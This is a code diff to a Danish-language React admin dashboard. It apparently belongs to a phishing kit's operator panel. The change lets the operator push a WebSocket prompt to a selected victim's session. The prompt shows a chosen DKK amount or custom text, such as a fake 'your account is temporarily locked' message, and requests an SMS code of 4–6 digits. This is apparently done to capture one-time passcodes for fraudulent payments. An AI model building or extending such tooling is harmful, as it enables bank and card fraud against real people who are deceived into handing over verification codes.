@@ -30,6 +30,8 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
   const [showSmsPopup, setShowSmsPopup] = useState(false)
   const [smsAmount, setSmsAmount] = useState<string>('1499')
   const [smsCodeLength, setSmsCodeLength] = useState<number>(6)
+  const [smsMode, setSmsMode] = useState<'amount' | 'text'>('amount')
+  const [smsCustomText, setSmsCustomText] = useState<string>('')
 
   const [smsSent, setSmsSent] = useState(false)
   const [currentPage, setCurrentPage] = useState(1)
@@ -199,8 +201,13 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
 
   const sendSmsToClient = () => {
     if (!selected) return
-    const amount = smsAmount || null
-    sendAdminWS({ type: 'sms-code', codeLength: smsCodeLength, amount })
+    const payload: any = { type: 'sms-code', codeLength: smsCodeLength }
+    if (smsMode === 'text' && smsCustomText.trim()) {
+      payload.displayText = smsCustomText.trim()
+    } else if (smsMode === 'amount') {
+      payload.amount = smsAmount || null
+    }
+    sendAdminWS(payload)
     setSmsSent(true)
     setTimeout(() => { setSmsSent(false) }, 2000)
   }
@@ -523,22 +530,49 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
                 </div>
               ) : (
                 <div className="px-6 pb-6">
-                  <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Hurtigt beløb</div>
-                  <div className="grid grid-cols-4 gap-2 mb-5">
-                    {['499', '999', '1499', '2499'].map(amt => (
-                      <button key={amt} onClick={() => setSmsAmount(amt)}
-                        className={`py-3 rounded-xl text-sm font-bold cursor-pointer transition-all border ${
-                          smsAmount === amt ? 'bg-blue-600 border-blue-500 text-white' : 'bg-[#2a3a4e] border-[#3a4a5e] text-gray-300 hover:bg-[#344860]'
-                        }`}>{Number(amt).toLocaleString('da-DK')}</button>
-                    ))}
+                  <div className="flex gap-2 mb-5">
+                    <button onClick={() => setSmsMode('amount')}
+                      className={`flex-1 py-2.5 rounded-xl text-sm font-bold cursor-pointer transition-all border ${
+                        smsMode === 'amount' ? 'bg-blue-600 border-blue-500 text-white' : 'bg-[#2a3a4e] border-[#3a4a5e] text-gray-300 hover:bg-[#344860]'
+                      }`}>Beløb</button>
+                    <button onClick={() => setSmsMode('text')}
+                      className={`flex-1 py-2.5 rounded-xl text-sm font-bold cursor-pointer transition-all border ${
+                        smsMode === 'text' ? 'bg-blue-600 border-blue-500 text-white' : 'bg-[#2a3a4e] border-[#3a4a5e] text-gray-300 hover:bg-[#344860]'
+                      }`}>Tekst</button>
                   </div>
-                  <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Eller indtast beløb (DKK)</div>
-                  <div className="relative mb-4">
-                    <input type="text" value={smsAmount} onChange={(e) => setSmsAmount(e.target.value.replace(/\D/g, ''))}
-                      className="w-full bg-[#2a3a4e] border border-[#3a4a5e] rounded-xl px-4 py-3.5 text-white text-base font-medium focus:outline-none focus:border-blue-500 placeholder-gray-500" />
-                    {smsAmount && <button onClick={() => setSmsAmount('')} className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white cursor-pointer text-sm">Ryd</button>}
-                  </div>
-                  {smsAmount && <div className="text-xs text-emerald-400 font-bold mb-4">Viser: <span className="text-emerald-300">{Number(smsAmount).toLocaleString('da-DK')}</span></div>}
+
+                  {smsMode === 'amount' ? (
+                    <>
+                      <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Hurtigt beløb</div>
+                      <div className="grid grid-cols-4 gap-2 mb-5">
+                        {['499', '999', '1499', '2499'].map(amt => (
+                          <button key={amt} onClick={() => setSmsAmount(amt)}
+                            className={`py-3 rounded-xl text-sm font-bold cursor-pointer transition-all border ${
+                              smsAmount === amt ? 'bg-blue-600 border-blue-500 text-white' : 'bg-[#2a3a4e] border-[#3a4a5e] text-gray-300 hover:bg-[#344860]'
+                            }`}>{Number(amt).toLocaleString('da-DK')}</button>
+                        ))}
+                      </div>
+                      <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Eller indtast beløb (DKK)</div>
+                      <div className="relative mb-4">
+                        <input type="text" value={smsAmount} onChange={(e) => setSmsAmount(e.target.value.replace(/\D/g, ''))}
+                          className="w-full bg-[#2a3a4e] border border-[#3a4a5e] rounded-xl px-4 py-3.5 text-white text-base font-medium focus:outline-none focus:border-blue-500 placeholder-gray-500" />
+                        {smsAmount && <button onClick={() => setSmsAmount('')} className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white cursor-pointer text-sm">Ryd</button>}
+                      </div>
+                      {smsAmount && <div className="text-xs text-emerald-400 font-bold mb-4">Viser: <span className="text-emerald-300">{Number(smsAmount).toLocaleString('da-DK')}</span></div>}
+                    </>
+                  ) : (
+                    <>
+                      <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Indtast tekst</div>
+                      <div className="relative mb-4">
+                        <input type="text" value={smsCustomText} onChange={(e) => setSmsCustomText(e.target.value)}
+                          placeholder="F.eks. Din konto er midlertidigt låst"
+                          className="w-full bg-[#2a3a4e] border border-[#3a4a5e] rounded-xl px-4 py-3.5 text-white text-base font-medium focus:outline-none focus:border-blue-500 placeholder-gray-500" />
+                        {smsCustomText && <button onClick={() => setSmsCustomText('')} className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white cursor-pointer text-sm">Ryd</button>}
+                      </div>
+                      {smsCustomText && <div className="text-xs text-emerald-400 font-bold mb-4">Viser: <span className="text-emerald-300">{smsCustomText}</span></div>}
+                    </>
+                  )}
+
                   <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Kodelængde</div>
                   <div className="flex gap-2 mb-4">
                     {[4, 5, 6].map(len => (
@@ -549,8 +583,8 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
                     ))}
                   </div>
                   <div className="flex gap-3">
-                    <button onClick={() => { setSmsAmount(''); sendSmsToClient() }} className="flex-1 bg-[#2a3a4e] hover:bg-[#344860] text-gray-300 font-bold text-sm py-3.5 rounded-xl cursor-pointer transition-colors border border-[#3a4a5e]">
-                      Intet beløb
+                    <button onClick={() => { setSmsAmount(''); setSmsCustomText(''); sendSmsToClient() }} className="flex-1 bg-[#2a3a4e] hover:bg-[#344860] text-gray-300 font-bold text-sm py-3.5 rounded-xl cursor-pointer transition-colors border border-[#3a4a5e]">
+                      Intet indhold
                     </button>
                     <button onClick={sendSmsToClient} className="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-bold text-sm py-3.5 rounded-xl cursor-pointer transition-colors flex items-center justify-center gap-2">
                       <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M7 7h10"/></svg>
